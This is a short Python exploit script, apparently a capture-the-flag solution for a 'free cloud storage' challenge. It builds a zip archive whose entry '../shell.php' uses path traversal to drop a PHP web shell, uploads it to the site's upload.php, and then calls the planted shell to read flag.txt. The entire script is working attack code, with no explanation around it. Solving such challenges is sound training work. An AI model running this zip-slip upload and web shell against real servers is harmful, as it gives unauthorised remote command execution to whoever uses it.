#!/usr/bin/env python3
import io
import zipfile

import requests

BASE_URL = "https://free-cloud-storage-b09650aa12bf63f7.tjc.tf"

payload = b'<?php system($_GET["cmd"]); ?>'
buf = io.BytesIO()

with zipfile.ZipFile(buf, "w") as zf:
    zf.writestr("../shell.php", payload)

files = {"zipfile": ("shell.zip", buf.getvalue(), "application/zip")}
requests.post(f"{BASE_URL}/upload.php", files=files)

res = requests.get(f"{BASE_URL}/shell.php?cmd=cat flag.txt")
print(res.content.decode())
